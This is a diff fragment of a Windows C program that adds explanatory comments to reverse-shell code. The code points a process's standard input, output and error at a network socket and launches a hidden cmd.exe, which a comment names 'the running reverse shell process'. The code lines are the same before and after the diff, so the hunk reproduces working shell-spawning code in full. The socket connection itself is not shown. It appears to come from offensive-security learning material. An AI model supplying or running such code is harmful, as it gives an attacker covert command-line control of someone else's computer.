@@ -40,13 +40,13 @@ int main(void)
 
 	STARTUPINFO sinfo;
 	memset(&sinfo, 0, sizeof(sinfo));
-	sinfo.cb = sizeof(sinfo);
-	sinfo.dwFlags = (STARTF_USESTDHANDLES);
-	sinfo.hStdInput = (HANDLE)sockt;
-	sinfo.hStdOutput = (HANDLE)sockt;
-	sinfo.hStdError = (HANDLE)sockt;
+	sinfo.cb = sizeof(sinfo); //initializes the struct size
+	sinfo.dwFlags = (STARTF_USESTDHANDLES); 
+	sinfo.hStdInput = (HANDLE)sockt; //Reading input from the given socket.
+	sinfo.hStdOutput = (HANDLE)sockt; //Writing output to the socket
+	sinfo.hStdError = (HANDLE)sockt; //Writing error to the socket. A lot like the C example. 
 	PROCESS_INFORMATION pinfo;
-	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
+	CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo); //Creates the running reverse shell process.
 
 	return (0);
 }
